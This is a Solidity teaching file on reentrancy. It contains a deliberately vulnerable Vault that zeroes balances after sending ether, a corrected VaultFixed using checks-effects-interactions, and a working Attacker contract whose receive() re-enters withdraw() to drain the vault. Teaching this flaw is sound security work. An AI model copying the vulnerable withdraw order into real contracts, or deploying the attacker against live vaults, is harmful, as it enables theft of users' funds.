// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// A vault that pays out with the ledger update after the external call.
/// The defect is the order of the last three statements of withdraw().
contract Vault {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];                 // time of check: read the ledger
        require(amount > 0, "nothing to withdraw");
        (bool sent, ) = msg.sender.call{value: amount}("");    // interaction: control leaves the contract
        require(sent, "transfer failed");
        balances[msg.sender] = 0;                              // effect: the ledger catches up (too late)
    }
}

/// The same vault with the effect before the interaction
/// (checks, effects, interactions).
contract VaultFixed {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];                 // time of check
        require(amount > 0, "nothing to withdraw");
        balances[msg.sender] = 0;                              // effect first
        (bool sent, ) = msg.sender.call{value: amount}("");    // interaction last
        require(sent, "transfer failed");
    }
}

/// The depositor whose receive() calls back into the vault while the
/// vault's own withdraw() is still waiting on the transfer.
contract Attacker {
    IVault public immutable vault;
    uint256 public immutable stake;

    constructor(IVault v) payable {
        vault = v;
        stake = msg.value;
        v.deposit{value: msg.value}();
    }

    function attack() external {
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= stake) {                 // reenter while the vault can still pay a round
            try vault.withdraw() {} catch {}                   // a failed round is swallowed; the outer call still succeeds
        }
    }
}

/// The surface shared by both vault variants, so one Attacker drives either.
/// `Vault` and `VaultFixed` match it structurally; neither declares `is
/// IVault`, so there is nothing to keep in sync and no `override` noise. The
/// factory and the attacker reach a vault only through this interface.
interface IVault {
    function deposit() external payable;
    function withdraw() external;
    function balances(address) external view returns (uint256);
}
